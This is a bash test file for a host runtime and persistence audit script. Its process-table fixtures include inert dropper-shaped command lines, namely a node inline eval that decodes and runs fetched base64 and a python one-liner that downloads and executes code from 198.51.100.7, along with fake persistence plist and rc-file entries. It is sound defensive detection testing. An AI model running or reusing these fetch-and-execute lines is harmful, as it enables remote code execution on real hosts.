#!/usr/bin/env bash
# Fixture tests for runtime-audit.sh (host runtime / persistence audit).
#
# Fully offline and deterministic: process detection runs against captured
# `ps` output via --ps-file, and the drift checks run against a throwaway HOME
# and baseline directory. No process is spawned and nothing on the real host is
# read for a verdict. The dropper-shaped command lines below are DETECTION
# FIXTURES — inert strings, never executed.
#
# Usage: bash tests/test-runtime-audit.sh
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
AUDIT="$ROOT/scripts/runtime-audit.sh"
FAILURES=0
TMP="$(mktemp -d "${TMPDIR:-/tmp}/runtime-audit-test.XXXXXX")"
trap 'chmod -R u+w "$TMP" 2>/dev/null; rm -rf "$TMP"' EXIT

LAST_OUT=""

# Run the audit with an isolated HOME + baseline so nothing on the real host
# influences the verdict.
run_audit() { # label, expected_exit, baseline_subdir, [extra args...]
  local label="$1" expect="$2" base="$3"; shift 3
  local out code=0
  set +e
  out=$(HOME="$TMP/sandbox-home" bash "$AUDIT" --baseline-dir "$TMP/$base" "$@" 2>&1)
  code=$?
  set -e
  LAST_OUT="$out"
  if [[ "$code" -eq "$expect" ]]; then
    echo "  ok  $label (exit $code)"
  else
    echo "  XX  $label — expected exit $expect got $code"
    echo "$out" | tail -12
    FAILURES=$((FAILURES+1))
  fi
}
expect_in() {
  if echo "$LAST_OUT" | grep -qF -- "$2"; then echo "  ok  $1"
  else echo "  XX  $1 — output lacks: $2"; FAILURES=$((FAILURES+1)); fi
}
expect_not_in() {
  if echo "$LAST_OUT" | grep -qF -- "$2"; then
    echo "  XX  $1 — output should not contain: $2"; FAILURES=$((FAILURES+1))
  else echo "  ok  $1"; fi
}

mkdir -p "$TMP/sandbox-home/Library/LaunchAgents" "$TMP/sandbox-home/.claude" "$TMP/sandbox-home/.codex"

echo "agent-security test-runtime-audit — offline fixtures"
echo "---"

# --- process-table fixtures ------------------------------------------------

# Benign: ordinary tooling, no inline eval, plus a short-lived inline eval.
cat >"$TMP/ps-clean.txt" <<'EOF'
  501     1 10-04:12:33 /sbin/launchd
 1200   501    02:14:07 /usr/local/bin/node /srv/app/server.js
 1310  1200       00:03 node -e console.log(process.version)
 1450     1    05:22:10 /usr/local/bin/python3 /srv/tools/indexer.py
EOF
run_audit "clean process table" 0 base-clean --ps-file "$TMP/ps-clean.txt"
expect_in "short-lived inline eval is normal" "short-lived"
expect_not_in "no CRIT on clean table" "CRIT  "

# The real-world shape: a long-lived inline eval carrying decode + fetch + respawn
# and a blockchain C2 host, all on one command line. Inert fixture string.
cat >"$TMP/ps-dropper.txt" <<'EOF'
 4242     1  3-19:50:12 node -e const{spawn}=require('child_process');eval(Buffer.from(fetch('https://api.trongrid.io/v1/x'),'base64').toString())
EOF
run_audit "dropper-shaped inline eval is CRIT" 1 base-drop --ps-file "$TMP/ps-dropper.txt"
expect_in "names the exec sink" "exec-sink:eval"
expect_in "names the encoder" "encoder"
expect_in "names the fetcher" "network-fetch"
expect_in "names the C2 class" "blockchain-c2"
expect_in "gives a triage command" "lsof -nP -p 4242"
expect_in "routes to containment guidance" "kill -STOP"

# Long-lived inline eval with no dropper markers: suspicious, not conclusive.
cat >"$TMP/ps-longeval.txt" <<'EOF'
 5150  4000    06:10:00 node -e setInterval(()=>{},1000)
EOF
run_audit "long-lived plain inline eval is WARN only" 0 base-long --ps-file "$TMP/ps-longeval.txt"
expect_in "warns on longevity" "long-lived inline-eval"
expect_not_in "does not escalate without markers" "dropper markers"

# Orphaned (PPID 1) long-lived inline eval: the detached-stager shape.
cat >"$TMP/ps-orphan.txt" <<'EOF'
 6001     1  1-02:00:00 python3 -c import urllib.request;exec(urllib.request.urlopen('http://198.51.100.7/p').read())
EOF
run_audit "orphaned inline eval is CRIT" 1 base-orphan --ps-file "$TMP/ps-orphan.txt"
expect_in "flags reparenting" "orphaned"

# A legitimate PPID-1 service must not be flagged just for being service-managed.
cat >"$TMP/ps-service.txt" <<'EOF'
 7002     1  9-11:00:00 /usr/local/bin/node /usr/local/lib/svc/server.js
EOF
run_audit "service-managed process is not flagged" 0 base-svc --ps-file "$TMP/ps-service.txt"
expect_in "clean verdict" "RUNTIME: CLEAN"

# Blockchain RPC alone is normal on this host — it must not fire without an eval sink.
cat >"$TMP/ps-rpc.txt" <<'EOF'
 8003  7000    04:00:00 /usr/local/bin/node /srv/rpc/bench.js --endpoint https://api.trongrid.io
EOF
run_audit "blockchain RPC alone is not suspicious" 0 base-rpc --ps-file "$TMP/ps-rpc.txt"
expect_not_in "no C2 flag without an eval sink" "blockchain-c2"

# A dev server whose SCRIPT takes a -p flag is not an inline eval. This fired as a
# CRIT on a real machine: `node /path/to/pnpm start -p 3011` matched a naive
# `node .* -p` pattern, and an audit that reports dev servers hourly gets switched off.
cat >"$TMP/ps-devserver.txt" <<'EOF'
 65185     1    01:26:54 node /usr/local/bin/pnpm start -p 3011
 65186     1    02:10:00 node /srv/app/cli.js --print report.json
 65187  4000    00:40:00 python3 /srv/tools/run.py -c config.yaml
EOF
run_audit "script flags are not interpreter flags" 0 base-dev --ps-file "$TMP/ps-devserver.txt"
expect_in "clean verdict" "RUNTIME: CLEAN"
expect_not_in "dev server not named" "pid 65185"
expect_not_in "cli --print not named" "pid 65186"
expect_not_in "script -c flag not named" "pid 65187"

# ...but real interpreter flags still match, including after interpreter options.
cat >"$TMP/ps-realeval.txt" <<'EOF'
 7100     1  2-00:00:00 node --experimental-vm-modules -e eval(Buffer.from(x,'base64'))
 7101     1  2-00:00:00 python3 -W ignore -c exec(urllib.request.urlopen(u).read())
EOF
run_audit "interpreter flags after options still match" 1 base-real --ps-file "$TMP/ps-realeval.txt"
expect_in "flags the node inline eval" "pid 7100"
expect_in "flags the python inline eval" "pid 7101"

# --- drift fixtures --------------------------------------------------------

# First run records the baseline; an immediate second run must be clean.
run_audit "first run records baseline" 0 base-drift --ps-file "$TMP/ps-clean.txt"
expect_in "baseline recorded" "baseline recorded"
run_audit "second run sees no drift" 0 base-drift --ps-file "$TMP/ps-clean.txt"
expect_in "no autostart drift" "no autostart drift"
expect_in "no profile drift" "no shell profile / agent config drift"

# A new plist is the reboot-persistence shape.
printf '<plist/>\n' >"$TMP/sandbox-home/Library/LaunchAgents/com.evil.persist.plist"
run_audit "new plist is drift" 0 base-drift --ps-file "$TMP/ps-clean.txt"
expect_in "reports the added autostart entry" "com.evil.persist.plist"
expect_in "labels it ADDED" "ADDED:"

# Autostart directories are hashed in full, not filtered by extension: a cron.d or
# XDG autostart entry has no suffix to match on, and every file in such a directory
# is a persistence mechanism by definition.
mkdir -p "$TMP/sandbox-home/.config/autostart"
printf '[Desktop Entry]\n' >"$TMP/sandbox-home/.config/autostart/beacon"
run_audit "extensionless autostart entry is drift" 0 base-drift --ps-file "$TMP/ps-clean.txt"
expect_in "reports the extensionless entry" "autostart/beacon"

# A modified rc file shows up as CHANGED, not as ADDED.
printf 'export PATH=$PATH\n' >"$TMP/sandbox-home/.zshrc"
run_audit "new rc file is drift" 0 base-drift --ps-file "$TMP/ps-clean.txt"
expect_in "reports the rc file" ".zshrc"

# --update-baseline accepts the current state; the next run is clean again.
run_audit "update-baseline accepts state" 0 base-drift --ps-file "$TMP/ps-clean.txt" --update-baseline
run_audit "post-accept run is clean" 0 base-drift --ps-file "$TMP/ps-clean.txt"
expect_not_in "drift cleared" "com.evil.persist.plist"

printf 'export EVIL=1\n' >>"$TMP/sandbox-home/.zshrc"
run_audit "edited rc file is CHANGED" 0 base-drift --ps-file "$TMP/ps-clean.txt"
expect_in "labels it CHANGED" "CHANGED:"

# --- failure modes ---------------------------------------------------------

# The regression this suite exists for: an unwritable baseline used to print
# "everything REMOVED" with an empty ADDED list — a false clean on the axis that
# matters. It must now report BLIND and exit 2.
mkdir -p "$TMP/ro-base"
: >"$TMP/ro-base/autostart.txt"
chmod 500 "$TMP/ro-base"
run_audit "unwritable baseline is BLIND, not clean" 2 ro-base --ps-file "$TMP/ps-clean.txt"
expect_in "says BLIND" "BLIND"
expect_in "says nothing was compared" "nothing was compared"
expect_not_in "never claims no drift" "no autostart drift"
chmod 700 "$TMP/ro-base"

# stderr must stay clean when the baseline is unwritable (no raw shell errors).
chmod 500 "$TMP/ro-base"
set +e
HOME="$TMP/sandbox-home" bash "$AUDIT" --baseline-dir "$TMP/ro-base" --ps-file "$TMP/ps-clean.txt" \
  >/dev/null 2>"$TMP/stderr.txt"
set -e
chmod 700 "$TMP/ro-base"
if [[ -s "$TMP/stderr.txt" ]]; then
  echo "  XX  BLIND path leaks raw shell errors to stderr"; head -3 "$TMP/stderr.txt"
  FAILURES=$((FAILURES+1))
else
  echo "  ok  BLIND path keeps stderr clean"
fi

# A missing --ps-file is an operational failure, not a clean audit.
run_audit "missing ps-file exits 2" 2 base-missing --ps-file "$TMP/does-not-exist.txt"

# Unknown arguments are rejected rather than silently ignored.
run_audit "unknown argument rejected" 2 base-args --nonsense

echo "---"
if [[ "$FAILURES" -eq 0 ]]; then
  echo "ALL PASS"
  exit 0
else
  echo "FAILURES: $FAILURES"
  exit 1
fi
